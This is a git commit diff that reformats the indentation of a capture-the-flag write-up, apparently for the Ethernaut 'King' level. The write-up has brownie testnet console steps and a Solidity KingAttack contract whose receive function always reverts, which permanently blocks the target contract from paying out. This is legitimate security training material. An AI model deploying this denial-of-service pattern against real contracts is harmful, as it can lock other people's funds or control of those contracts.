1ce8c4a32c815e40f17018552272dc8223f87560
Mohammad Sabti <sabtikw@gmail.com>
2021-07-20 13:45:11 +0300

    fix King.sol

--- contracts/9-King.sol
+++ contracts/9-King.sol
@@ -4,7 +4,6 @@ create a contract that sends eth to the King contract , to break the King contra
 add a revert statement to the receive function so everytime fallback tries to send eth to your contract 
 the transaction reverts 
 
-
 # Open brownie console with rinkeby testnet
 
 brownie console --network rinkeby
@@ -12,7 +11,6 @@ brownie console --network rinkeby
 # import your account using mnemonic
 
 accounts.from_mnemonic("your account mnemonic")
-
 
 # Deloy the attack Contract
 
@@ -34,30 +32,30 @@ pragma solidity 0.8.6;
 contract KingAttack {
 
 
-address owner;
+    address owner;
 
-constructor()  {
-owner = msg.sender;
-    }
+    constructor()  {
+        owner = msg.sender;
+        }
 
-function sendEth(address payable _king) public payable  {
-    // send eth to the King Contract
-    (bool success,) = _king.call{gas: 50000, value: address(this).balance}("");
-    require(success);
+    function sendEth(address payable _king) public payable  {
+        // send eth to the King Contract
+        (bool success,) = _king.call{gas: 50000, value: address(this).balance}("");
+        require(success);
 
-}
+        }
 
 
-receive() external payable {
+    receive() external payable {
         // revert when recieving eth from King contract. this will prevent the King contract from fully excuting the fallback function code
         // note :  the transfer function in King Contract reverts upon failed transfer
-    revert();
+        revert();
 
     }
 
-function destroy() external {
+    function destroy() external {
 
-    selfdestruct(payable(owner));
+        selfdestruct(payable(owner));
     
     }
 
